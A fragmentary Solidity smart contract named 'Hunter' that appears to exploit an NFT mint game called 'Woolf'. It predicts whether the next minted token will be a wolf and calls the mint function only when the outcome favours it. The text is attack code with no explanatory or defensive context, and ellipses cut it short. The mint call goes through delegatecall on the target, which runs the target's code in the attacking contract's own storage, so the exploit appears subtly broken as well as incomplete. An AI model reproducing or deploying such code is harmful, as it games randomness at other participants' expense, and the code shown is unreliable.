...
contract Hunter is Ownable {
    function catchWalf(address woolfAddr) public payable onlyOwner {
        Woolf woolf = Woolf(woolfAddr);
        uint256 tokenid = woolf.minted()+1;
        bool iw = isWoolf(tokenid);
        if (iw) {
            (bool success, bytes memory data) = woolfAddr.delegatecall(
                abi.encodeWithSignature("mint(uint256,bool)", 1, false)
            );
            if (!success) {
                revert("failed1231");
            }
    ...
    function isWoolf(uint256 minted) internal view returns (bool t) {
